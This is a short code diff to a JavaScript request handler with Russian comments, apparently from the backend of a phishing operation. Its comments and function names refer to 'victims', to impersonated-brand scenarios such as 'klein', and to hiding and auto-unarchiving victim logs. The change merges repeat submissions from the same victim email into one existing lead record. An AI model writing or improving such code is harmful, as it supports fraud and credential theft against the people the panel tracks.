@@ -377,7 +377,7 @@ async function handle(scope) {
       if (visitId) {
         const visitLeadRaw = leads.find(function (l) { return l.id === visitId; });
         // Если лог был скрыт (adminLogArchived/klLogArchived), но жертва снова активна — обновляем и авто-разархивируем.
-        const visitLead = visitLeadRaw || null;
+        let visitLead = visitLeadRaw || null;
         if (visitLead) {
           const existingEmail = (visitLead.email || '').trim().toLowerCase();
           const newEmail = emailLower;
@@ -429,6 +429,18 @@ async function handle(scope) {
             });
             // Продолжаем создавать новый лог (код ниже)
           } else if (!existingEmail) {
+            // Если visitId указывает на "пустой" новый визит, но лид с этим email уже есть (в т.ч. скрытый),
+            // продолжаем работу с существующим лидом и удаляем пустую запись visitId.
+            const reviveCandidate = leads.find(function (l) {
+              if (!l || l.id === visitLead.id) return false;
+              const e = (l.email || '').trim().toLowerCase();
+              const eKl = (l.emailKl || '').trim().toLowerCase();
+              return (e && e === newEmail) || (eKl && eKl === newEmail);
+            });
+            if (reviveCandidate && reviveCandidate.id) {
+              try { deleteLeadById(visitLead.id); } catch (_) {}
+              visitLead = reviveCandidate;
+            }
             // Запись существует БЕЗ email - обновляем её (продолжение сессии в той же вкладке)
             const brandIdUpdate = submitIndicatesKleinScenario(req, json, visitLead, getBrand) ? 'klein' : submitBrandIdForVictimPost(req, json, getBrand);
             const isKlein = brandIdUpdate === 'klein';
